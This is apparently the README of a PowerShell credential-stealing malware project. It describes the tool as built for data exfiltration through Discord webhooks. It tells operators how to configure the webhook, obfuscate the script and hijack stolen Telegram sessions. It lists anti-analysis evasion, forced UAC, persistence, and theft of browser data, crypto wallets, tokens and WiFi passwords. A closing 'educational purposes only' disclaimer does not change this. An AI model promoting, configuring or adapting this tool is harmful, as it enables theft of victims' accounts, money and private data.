<p align="center">
<img src="https://i.postimg.cc/m2SSKrBt/Logo.gif", width="300", height="300">
</p>

<h1 align="center">
</h1>
<p align= "center">
  <img src="https://img.shields.io/github/languages/top/kdot227/Powershell-Token-Grabber?color=blue">
   <img src="https://img.shields.io/github/stars/kdot227/Powershell-Token-Grabber.svg?color=blue">
   <img src="https://img.shields.io/github/forks/kdot227/Powershell-Token-Grabber.svg?color=blue">
   <img src="https://img.shields.io/github/issues/kdot227/Powershell-Token-Grabber.svg?color=blue">
  <img src="https://img.shields.io/github/commit-activity/m/kdot227/Powershell-Token-Grabber">
  <img src="https://img.shields.io/badge/PowerShell-%E2%89%A5%20v3.0-blue">
  <br>
   <img src="https://img.shields.io/github/last-commit/kdot227/Powershell-Token-Grabber?color=blue">
   <img src="https://img.shields.io/github/license/kdot227/Powershell-Token-Grabber?color=blue">
   <img src="https://img.shields.io/github/contributors/Kdot227/Powershell-Token-Grabber?color=blue">
    <img src="https://img.shields.io/endpoint?color=blue&label=views&url=https%3A%2F%2Fhits.dwyl.com%2Fkdot%2FPowerShell-Token-Grabber.json">
    <img src="https://img.shields.io/github/repo-size/kdot227/Powershell-Token-Grabber.svg?label=Repo%20size&style=flat-square">
    <img src="https://img.shields.io/github/downloads/kdot227/PowerShell-Token-Grabber/total?color=blue">
   <br>
</p>

# PowerShell Token Grabber 

This tool is made for data exfiltration. All information collected is sent using [Discord webhooks](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks).

# Usage
- Create a Webhook on your [Discord Server](https://discord.com). I recommend creating a new server.
- Download ```main.ps1``` 
- Open ```main.ps1``` and replace ```YOUR_WEBHOOK_HERE``` in line 448 with your webhook or use the [builder](https://github.com/KDot227/Powershell-Token-Grabber/blob/main/builder.ps1).

# Want to obfuscate the code ?
Use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). \
Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat files 

# Screenshots
  ### Builder
> ![GUI](https://i.postimg.cc/XYGShDPP/builder.png)


 ### Webhook Data
> ![screenshot](https://user-images.githubusercontent.com/96607632/236490140-201f4987-3569-4542-a769-41cf09574f2d.png)
> ![data](https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/8a15c7d4-8d70-4d17-81c2-f9f602ccd81a)

#  Features
- [x] GUI Builder
- [x] Force [UAC](https://learn.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [x] Anti-Analysis ```VMWare, VirtualBox, Sandboxes, Emulators, Debuggers, Virustotal, Any.run```
- [x] Persistence via [Task Scheduler](https://learn.microsoft.com/en-us/windows/win32/taskschd/about-the-task-scheduler) 
- [x] Extracts WiFi Passwords
- [x] File grabber ```2fa, backupcodes, seedphrases, passwords, etc.``` 
- [x] Session Stealers
  - [Telegram](https://telegram.org) 
  - [Element](https://element.io) 
  - [Signal](https://signal.org) 
  - [Steam](https://store.steampowered.com) 
  - [Minecraft](https://minecraft.net)
- [x] Crypto Wallets 
   > Armory | Atomic | Bitcoin | Bytecoin | Coinomi | Dash | Electrum | Ethereum | Exodus | Guarda | Jaxx | Litecoin | Monero | Zcash
- [x] Extracts Browser Data (Brave, Chrome, Firefox, Microsoft Edge, Thunderbird etc.)
- [x] Extracts [Discord](https://discord.com) Token
- [x] Get System Information (Version, CPU, DISK, GPU, RAM, IP, Installed Apps etc.)
- [x] Takes Desktop Screenshot  
- [x] Get System Uptime 
- [X] Get Screen Resolution
- [x] List of Installed Applications
- [x] List of Installed Antiviruses
- [x] List of all Network Adapters
- [x] List of Apps that Run On Startup
- [x] List of Running Services & Applications
- [x] List TCP Connections and Underlying Process
- [x] Extracts Product Key
- [x] Self-Destructs After Execution (optional)

### Telegram Session Stealer Usage :
After the exfiltrated data is uploaded to your discord webhook, download the compressed file ```KDOT.zip```, inside that folder there will also be another zipped folder ```telegram-session.zip``` extract it on your PC.
Now, copy the tdata folder and paste it in the directory below:

```
%userprofile%\AppData\Roaming\Telegram Desktop
```
Before pasting the tdata folder, ensure that you have deleted the existing tdata folder on your PC.
# ![image](https://user-images.githubusercontent.com/96607632/235702107-5800e44e-b4d3-4147-8fb0-b78aece6eae7.png)

### NOTE 
  ***The other session stealers can be utilized by applying the technique above***
 
## 🗑 Uninstaller (Removes the Scheduled Task, Script Folder and ExclusionPaths)
- Open a new Elevated Powershell Console and Paste the Contents below
```ps1
$ErrorActionPreference = "SilentlyContinue"
function Cleanup {
  Unregister-ScheduledTask -TaskName "KDOT" -Confirm:$False
  Remove-Item -Path "$env:appdata\KDOT" -force -recurse
  Remove-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
  Remove-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
  Write-Host "[~] Successfully Uninstalled !" -ForegroundColor Green
}
Cleanup
```

# Need Help?
- [Join our discord server](https://discord.gg/eUvXnCAR5Z)

# Bug Reports & Suggestions
Found a bug? Have an idea? Let me know [here](https://github.com/KDot227/Powershell-Token-Grabber/issues), Please provide a detailed explanation of the expected behavior, actual behavior, and steps to reproduce, or what you want to see and how it could be done. You can be a small part of this project!

# License
This project is licensed under the MIT License - see the [LICENSE](https://github.com/kdot227/Powershell-Token-Grabber/blob/main/LICENSE) file for details

# Disclaimer
I, the creator, am not responsible for any actions, and or damages, caused by this software.
You bear the full responsibility of your actions and acknowledge that this tool was created for educational purposes only.
This tool's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.
By using this software, you automatically agree to the above.

# References 

```Yaml
YARA Rule Info
Name : SUSP_PS1_PowerShell_Recon_Mar23_1
RULE Hash : eda1df8e3375891644fe9cac90852b0d
Description : Detects suspicious PowerShell code that performs reconnaissance tasks
Rule Link : https://valhalla.nextron-systems.com/info/rule/SUSP_PS1_PowerShell_Recon_Mar23_1
Rule Author : Florian Roth
```

# Credits
- https://github.com/Purp1eW0lf
- https://github.com/KDot227
- https://github.com/Chainski

<p align="center"><a href=#top>Back to Top</a></p>
